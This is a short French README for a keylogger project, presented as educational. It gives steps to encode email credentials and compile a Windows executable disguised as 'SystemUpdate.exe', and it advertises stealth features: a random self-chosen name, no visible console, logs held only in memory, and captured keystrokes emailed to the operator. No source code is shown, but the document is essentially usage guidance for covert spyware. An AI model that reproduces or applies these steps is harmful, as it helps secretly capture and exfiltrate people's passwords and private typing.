# Disclaimer
    Tout ce dossier est à but éducatif. Le fait de concevoir un keylogger et fait pour savoir comment s'en protéger. Il sert également de démonstration à des jeunes apprenants. Merci de ne pas utiliser ses script à des fins malveillantes. Y'a assé de fdp dans ce monde. 

[Pour essayer l'exercice rdv sur](https://gael-berru.com/klm/)

PROCÉDURE :

    Encode tes identifiants :

    cmd
    python encode_config.py

→ Copie la sortie dans ton script

  Compile en .exe :

    cmd
    compile.bat

    Le .exe (SystemUpdate.exe) :

    S'auto-nomme aléatoirement

    Pas de console visible

    Envoie les logs par email

    S'arrête avec STOPLOG

AVANTAGES .exe :

✅ Pas de fichiers logs - Tout en mémoire
✅ Pas de clé USB - Autonome
✅ Nom aléatoire - Difficile à repérer
✅ Pas de console - Invisible
✅ Identifiants encodés - Pas en plain text


POUR TESTER :

    Compile avec tes identifiants

    Lance le .exe

    Tape STOPLOG

    Vérifie tes emails